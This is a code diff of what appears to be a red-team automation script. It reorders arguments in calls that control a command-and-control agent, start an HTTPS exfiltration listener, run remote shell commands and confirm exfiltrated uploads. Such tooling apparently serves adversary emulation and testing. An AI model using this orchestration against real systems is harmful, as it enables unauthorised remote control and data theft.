@@ -131,7 +131,7 @@ print(f'\nVerifying that agent {c2_agent_name} exists.')
 c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
 c2_instruct_command = 'get_agents'
 c2_instruct_args = {'Name': c2_agent_name}
-agents_list = h.interact_with_task(c2_task_name, c2_instruct_instance, c2_instruct_command, c2_instruct_args)
+agents_list = h.interact_with_task(c2_task_name, c2_instruct_command, c2_instruct_instance, c2_instruct_args)
 agent_exists = False
 for agent in agents_list['agents']:
     if c2_agent_name == agent['name']:
@@ -180,7 +180,7 @@ exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in r
 print(f'\nStarting an exfil listener service on {exfil_task_name}.')
 instruct_args = {'listen_port': int(exfil_port), 'subj': exfil_subj}
 instruct_command = 'start_https_exfil_server'
-exfil_listener = h.interact_with_task(exfil_task_name, exfil_instruct_instance, instruct_command, instruct_args)
+exfil_listener = h.interact_with_task(exfil_task_name, instruct_command, exfil_instruct_instance, instruct_args)
 if exfil_listener['outcome'] == 'success':
     print('\nstart_https_exfil_server succeeded.\n')
     exfil_service_exists = [exfil_task_name, exfil_instruct_instance]
@@ -218,7 +218,7 @@ for command in command_list.split(', '):
     sc_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
     instruct_command = 'agent_shell_command'
     instruct_args = {'Name': c2_agent_name, 'command': shell_command}
-    command_response = h.interact_with_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
+    command_response = h.interact_with_task(c2_task_name, instruct_command, sc_instruct_instance, instruct_args)
     if command_response['outcome'] == 'success':
         print(f'{shell_command} succeeded.\n')
         command_task_id = command_response['message']['taskID']
@@ -234,7 +234,7 @@ for command in command_list.split(', '):
             try:
                 instruct_command = 'get_shell_command_results'
                 instruct_args = {'Name': c2_agent_name}
-                shell_results = h.interact_with_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
+                shell_results = h.interact_with_task(c2_task_name, instruct_command, sc_instruct_instance, instruct_args)
                 if shell_results['outcome'] == 'success':
                     for shell_result in shell_results['results']:
                         if shell_result['taskID'] == command_task_id:
@@ -264,7 +264,7 @@ for command in command_list.split(', '):
 confirm_exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
 print(f'\nConfirming that {exfil_outfile} was successfully uploaded to {exfil_task_name}.')
 instruct_command = 'ls'
-ls_command = h.interact_with_task(exfil_task_name, confirm_exfil_instruct_instance, instruct_command)
+ls_command = h.interact_with_task(exfil_task_name, instruct_command, confirm_exfil_instruct_instance)
 if ls_command['outcome'] == 'success':
     dir_contents = ls_command['local_directory_contents']
     if exfil_outfile in dir_contents:
